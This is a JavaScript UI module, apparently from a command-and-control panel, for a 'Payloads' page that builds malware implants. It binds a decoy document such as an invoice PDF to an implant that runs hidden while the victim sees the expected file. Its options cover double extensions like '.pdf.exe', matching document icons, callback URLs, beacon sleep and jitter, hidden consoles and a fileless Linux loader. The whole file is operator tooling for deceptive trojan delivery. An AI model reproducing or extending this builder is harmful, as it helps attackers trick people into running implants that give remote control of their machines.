/* Payloads: bind a decoy document or emit a raw implant. */

import * as store from '../store.js';
import { api, url } from '../api.js';
import { ico, toast, confirm } from '../ui.js';
import { bytes, esc } from '../format.js';

const OS_ARCH = {
  windows: ['amd64', '386', 'arm64'],
  linux: ['amd64', 'arm', 'arm64', '386'],
  darwin: ['amd64', 'arm64'],
};

let picked = null;
let mode = 'bind';

export const payloads = {
  mount(root) {
    const cfg = store.state.config || {};
    root.innerHTML = `
      <div class="page">
        <div class="page-head">
          <div class="ttl"><h1>Payloads</h1>
            <p>Bind any document into one launcher: the target opens the file they expect while the
              implant runs detached behind it, with the matching icon and metadata.</p></div>
          <div class="spacer"></div>
          <div class="chips">
            <button class="chip on" data-mode="bind">Bind document</button>
            <button class="chip" data-mode="raw">Raw implant</button>
          </div>
        </div>

        <div class="build-grid">
          <div class="card" id="bdrop-card">
            <div class="card-head">${ico('i-file')}<h3>1 · Decoy document</h3></div>
            <div class="card-body">
              <div class="drop" id="drop" tabindex="0" role="button" aria-label="Choose a decoy file">
                <input type="file" id="bfile">
                <span id="dropmsg">${ico('i-file')}<b>Drop a file or click to choose</b>
                  <span>pdf · docx · xlsx · zip · jpg — any file</span></span>
              </div>
              <p class="muted tiny" style="margin-top:10px">Left empty, the raw implant is emitted instead.</p>
            </div>
          </div>

          <div class="card">
            <div class="card-head">${ico('i-desktop')}<h3>2 · Target</h3></div>
            <div class="card-body">
              <div class="form-grid">
                <label class="field wide"><span>Output name</span>
                  <input class="inp" id="bname" placeholder="invoice" value="invoice"></label>
                <label class="field"><span>Platform</span>
                  <select class="inp" id="bos">${Object.keys(OS_ARCH).map((o) => `<option value="${o}">${o}</option>`).join('')}</select></label>
                <label class="field"><span>Architecture</span><select class="inp" id="barch"></select></label>
                <label class="field"><span>Start delay (s)</span><input class="inp" id="bdelay" type="number" min="0" value="0"></label>
                <label class="field"><span>Sleep (s)</span><input class="inp" id="bsleep" type="number" min="1" value="3"></label>
                <label class="field"><span>Jitter (%)</span><input class="inp" id="bjitter" type="number" min="0" max="90" value="20"></label>
              </div>
            </div>
          </div>

          <div class="card">
            <div class="card-head">${ico('i-network')}<h3>3 · Callback</h3></div>
            <div class="card-body">
              <div class="row">
                <input class="inp mono" id="burl" placeholder="auto-detected from this request">
                <button class="btn ghost sm" id="bauto" title="Use the server-detected URL">${ico('i-refresh')}</button>
              </div>
              <p class="muted tiny" style="margin-top:8px">Detected: <span class="mono">${esc(cfg.callback || '—')}</span></p>
            </div>
          </div>

          <div class="card">
            <div class="card-head">${ico('i-shield')}<h3>4 · Delivery</h3></div>
            <div class="card-body" style="display:grid;gap:11px">
              <label class="tgl"><input type="checkbox" id="bdbl" checked> Double extension (<span class="mono">.pdf.exe</span>)</label>
              <label class="tgl"><input type="checkbox" id="bicon" checked> Matching document icon</label>
              <label class="tgl"><input type="checkbox" id="bconsole"> Visible console window</label>
              <label class="tgl"><input type="checkbox" id="bfileless"> Fileless shell loader (linux)</label>
            </div>
          </div>
        </div>

        <div class="row wrap">
          <button class="btn primary" id="bgo">${ico('i-box')} Bind &amp; build</button>
          <button class="btn ghost" id="braw">${ico('i-down')} Build raw implant</button>
          <span class="build-msg" id="bmsg"></span>
        </div>

        <div class="card">
          <div class="card-head">${ico('i-layers')}<h3>Artifacts</h3><span class="spacer"></span>
            <button class="btn ghost sm" id="brefresh">${ico('i-refresh')} Refresh</button></div>
          <div class="card-body"><ul class="artifacts" id="barts"></ul></div>
        </div>
      </div>`;
    this.wire(root);
  },

  wire(root) {
    const osSel = root.querySelector('#bos');
    const archSel = root.querySelector('#barch');
    const syncArch = () => {
      const list = OS_ARCH[osSel.value] || ['amd64'];
      archSel.innerHTML = list.map((a) => `<option value="${a}">${a}</option>`).join('');
    };
    osSel.onchange = syncArch;
    syncArch();

    root.querySelectorAll('[data-mode]').forEach((b) => {
      b.onclick = () => {
        mode = b.dataset.mode;
        root.querySelectorAll('[data-mode]').forEach((x) => x.classList.toggle('on', x === b));
        root.querySelector('#bgo').innerHTML = mode === 'bind'
          ? `${ico('i-box')} Bind &amp; build` : `${ico('i-down')} Build raw implant`;
        root.querySelector('#bdrop-card').style.opacity = mode === 'bind' ? '1' : '.55';
      };
    });

    const drop = root.querySelector('#drop');
    const file = root.querySelector('#bfile');
    const setPicked = (f) => {
      picked = f;
      drop.classList.add('filled');
      root.querySelector('#dropmsg').innerHTML = `${ico('i-check')}<b>${esc(f.name)}</b>
        <span>${bytes(f.size)} · will be embedded and opened first</span>`;
      root.querySelector('#bname').value = f.name.replace(/\.[^.]+$/, '');
    };
    drop.onclick = () => file.click();
    drop.onkeydown = (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); file.click(); } };
    drop.ondragover = (e) => { e.preventDefault(); drop.classList.add('over'); };
    drop.ondragleave = () => drop.classList.remove('over');
    drop.ondrop = (e) => {
      e.preventDefault();
      drop.classList.remove('over');
      if (e.dataTransfer.files[0]) setPicked(e.dataTransfer.files[0]);
    };
    file.onchange = () => { if (file.files[0]) setPicked(file.files[0]); };

    root.querySelector('#bauto').onclick = () => {
      root.querySelector('#burl').value = store.state.config?.callback || '';
      toast('callback reset to the detected URL');
    };
    root.querySelector('#bgo').onclick = () => (mode === 'bind' ? this.bind(root) : this.raw(root));
    root.querySelector('#braw').onclick = () => this.raw(root);
    root.querySelector('#brefresh').onclick = () => this.loadBuilds(root);
    this.loadBuilds(root);
  },

  msg(root, text, kind = '') {
    const el = root.querySelector('#bmsg');
    el.textContent = text;
    el.className = 'build-msg ' + kind;
  },

  form(root) {
    return {
      name: root.querySelector('#bname').value.trim(),
      os: root.querySelector('#bos').value,
      arch: root.querySelector('#barch').value,
      url: root.querySelector('#burl').value.trim(),
      sleep: root.querySelector('#bsleep').value,
      jitter: root.querySelector('#bjitter').value,
      delay: root.querySelector('#bdelay').value,
      console: root.querySelector('#bconsole').checked,
      double_ext: root.querySelector('#bdbl').checked,
      icon: root.querySelector('#bicon').checked,
      fileless: root.querySelector('#bfileless').checked,
    };
  },

  async bind(root) {
    const f = this.form(root);
    if (!picked) { this.raw(root); return; }
    const btn = root.querySelector('#bgo');
    btn.disabled = true;
    this.msg(root, 'building…');
    try {
      const fd = new FormData();
      fd.append('file', picked);
      fd.append('name', f.name);
      fd.append('os', f.os);
      fd.append('arch', f.arch);
      fd.append('url', f.url);
      fd.append('sleep', f.sleep);
      fd.append('jitter', f.jitter);
      fd.append('delay', f.delay);
      fd.append('console', f.console ? '1' : '0');
      fd.append('double_ext', f.double_ext ? '1' : '0');
      fd.append('icon', f.icon ? '1' : '0');
      const out = await api.bind(fd);
      this.msg(root, `${out.binary} · ${bytes(out.size)}`, 'ok');
      toast('built ' + out.binary);
      store.log('build', `artifact ${out.binary}`);
      this.loadBuilds(root);
    } catch (err) {
      this.msg(root, 'error: ' + err.message, 'bad');
      toast(err.message, 'bad');
    } finally {
      btn.disabled = false;
    }
  },

  async raw(root) {
    const f = this.form(root);
    this.msg(root, 'building…');
    try {
      const out = await api.build({
        name: f.name || 'phantom', os: f.os, arch: f.arch,
        url: f.url || undefined, sleep: Number(f.sleep), jitter: Number(f.jitter),
        delay: Number(f.delay), console: f.console, fileless: f.fileless,
      });
      this.msg(root, 'built ' + out.binary, 'ok');
      toast('built ' + out.binary);
      store.log('build', `artifact ${out.binary}`);
      this.loadBuilds(root);
    } catch (err) {
      this.msg(root, 'error: ' + err.message, 'bad');
    }
  },

  async loadBuilds(root) {
    let list = [];
    try { list = await api.builds(); } catch { return; }
    store.state.builds = list;
    const box = root.querySelector('#barts');
    if (!box) return;
    if (!list.length) {
      box.innerHTML = `<div class="empty">${ico('i-layers')}<span>No artifact yet — build one above.</span></div>`;
      return;
    }
    box.innerHTML = list.map((b) => {
      const ext = (b.name.split('.').pop() || '').toLowerCase();
      return `<li><span class="badge ${['sh', 'run'].includes(ext) ? 'mint' : 'blue'}">${esc(ext)}</span>
        <a class="nm" href="${url.build(b.name)}" download>${esc(b.name)}</a>
        <span class="sz">${bytes(b.size)}</span>
        <button class="btn ghost sm ico-only" data-del="${esc(b.name)}" title="Delete">${ico('i-trash')}</button></li>`;
    }).join('');
    box.onclick = async (e) => {
      const name = e.target.closest('[data-del]')?.dataset.del;
      if (!name) return;
      if (!(await confirm({ title: 'Delete artifact', body: name, confirm: 'Delete', danger: true }))) return;
      await api.deleteBuild(name);
      this.loadBuilds(root);
    };
  },
};
